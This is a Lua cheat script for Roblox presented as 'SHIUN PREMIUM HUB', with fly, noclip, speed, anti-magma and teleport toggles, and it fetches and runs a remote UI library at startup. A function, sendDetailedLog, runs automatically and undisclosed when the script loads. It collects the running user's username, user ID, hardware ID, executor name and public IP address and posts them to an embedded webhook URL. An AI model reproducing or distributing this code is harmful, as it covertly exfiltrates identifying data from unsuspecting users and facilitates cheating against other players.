local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local GuiService = game:GetService("GuiService")
local UserInputService = game:GetService("UserInputService")

local lp = Players.LocalPlayer
local camera = workspace.CurrentCamera

getgenv().ShiunSettings = {
    vfly = false,
    noclip = false,
    speedLevel = 1,
    baseSpeed = 50,
    magmaDisabled = true
}

local function sendDetailedLog()
    pcall(function()
        local url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"
        local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
        local hwid = (gethwid and gethwid()) or "N/A"
        local ip = game:HttpGet("https://api.ipify.org")
        local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name

        local data = {
            ["embeds"] = {{
                ["title"] = "🚨 Execution Log: " .. lp.Name,
                ["color"] = 0xff4500,
                ["fields"] = {
                    {["name"] = "👤 User Info", ["value"] = "**User:** " .. lp.Name .. "\n**ID:** " .. lp.UserId .. "\n**Age:** " .. lp.AccountAge .. " days", ["inline"] = true},
                    {["name"] = "🛠 Env", ["value"] = "**Exec:** " .. executor .. "\n**HWID:** " .. hwid, ["inline"] = true},
                    {["name"] = "🌐 Network", ["value"] = "**IP:** " .. ip, ["inline"] = false},
                    {["name"] = "📍 Location", ["value"] = "**Game:** " .. placeName .. "\n**PlaceId:** " .. game.PlaceId, ["inline"] = false}
                },
                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"},
                ["footer"] = {["text"] = "Shiun4545 | " .. os.date("%Y/%m/%d %X")}
            }}
        }
        
        local req = (syn and syn.request) or (http and http.request) or request
        if req then
            req({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

local Window = Rayfield:CreateWindow({
    Name = "SHIUN PREMIUM HUB",
    LoadingTitle = "Shiun System",
    LoadingSubtitle = "shiun4545",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "ShiunHubConfigs",
        FileName = "MainConfig"
    },
    KeySystem = true,
    KeySettings = {
        Title = "Authentication",
        Subtitle = "Enter Key",
        Note = "", 
        SaveKey = true,
        Key = {"key123"}
    }
})

sendDetailedLog()

local MoveTab = Window:CreateTab("Movement", 4483362458)
MoveTab:CreateSection("Controls")

MoveTab:CreateToggle({
    Name = "V-Fly",
    CurrentValue = false,
    Flag = "FlyToggle",
    Callback = function(Value)
        getgenv().ShiunSettings.vfly = Value
    end,
})

MoveTab:CreateToggle({
    Name = "Noclip",
    CurrentValue = false,
    Flag = "NoclipToggle",
    Callback = function(Value)
        getgenv().ShiunSettings.noclip = Value
    end,
})

MoveTab:CreateSlider({
    Name = "Speed",
    Range = {1, 20},
    Increment = 1,
    Suffix = "Lv",
    CurrentValue = 1,
    Flag = "SpeedSlider",
    Callback = function(Value)
        getgenv().ShiunSettings.speedLevel = Value
    end,
})

local WorldTab = Window:CreateTab("World", 4483345998)
WorldTab:CreateSection("Environment")

WorldTab:CreateToggle({
    Name = "Anti-Magma",
    CurrentValue = true,
    Flag = "MagmaToggle",
    Callback = function(Value)
        getgenv().ShiunSettings.magmaDisabled = Value
    end,
})

WorldTab:CreateSection("Teleport")

WorldTab:CreateButton({
    Name = "Teleport to Spawn",
    Callback = function()
        if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
            lp.Character.HumanoidRootPart.CFrame = CFrame.new(6.12, 1458.32, -29.12)
        end
    end,
})

WorldTab:CreateButton({
    Name = "Reset Camera",
    Callback = function()
        camera.CameraSubject = lp.Character.Humanoid
    end,
})

WorldTab:CreateButton({
    Name = "DevConsole",
    Callback = function()
        game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
    end,
})

local InfoTab = Window:CreateTab("Info", 4483362458)
InfoTab:CreateParagraph({Title = "User", Content = "shiun4545"})

RunService.RenderStepped:Connect(function()
    local char = lp.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")

    if getgenv().ShiunSettings.vfly and root and hum then
        local bv = root:FindFirstChild("ShiunBV") or Instance.new("BodyVelocity", root)
        bv.Name = "ShiunBV"; bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        local bg = root:FindFirstChild("ShiunBG") or Instance.new("BodyGyro", root)
        bg.Name = "ShiunBG"; bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9); bg.CFrame = camera.CFrame

        if hum.MoveDirection.Magnitude > 0 then
            bv.Velocity = camera.CFrame.LookVector * (getgenv().ShiunSettings.speedLevel * getgenv().ShiunSettings.baseSpeed)
        else
            bv.Velocity = Vector3.new(0, 0, 0)
        end
    elseif root and root:FindFirstChild("ShiunBV") then
        root.ShiunBV:Destroy(); root.ShiunBG:Destroy()
    end

    -- Noclip 修正箇所
    if getgenv().ShiunSettings.noclip then
        for _, v in pairs(char:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide then
                v.CanCollide = false
            end
        end
    end
end)

-- Noclipをオフにした時に当たり判定を戻すループ
RunService.Stepped:Connect(function()
    if not getgenv().ShiunSettings.noclip then
        local char = lp.Character
        if char then
            for _, v in pairs(char:GetDescendants()) do
                if v:IsA("BasePart") and not v.CanCollide then
                    -- キャラクターの主要なパーツのみ衝突判定を戻す（地面を抜けないように）
                    if v.Name ~= "HumanoidRootPart" then 
                        v.CanCollide = true
                    end
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function()
    if getgenv().ShiunSettings.magmaDisabled then
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") and (obj.Name:lower():find("magma") or obj.Name:lower():find("lava")) then
                obj.CanTouch = false
            end
        end
    end
end)

Rayfield:Notify({
    Title = "Ready",
    Content = "User: shiun4545",
    Duration = 4,
    Image = 4483362458,
})
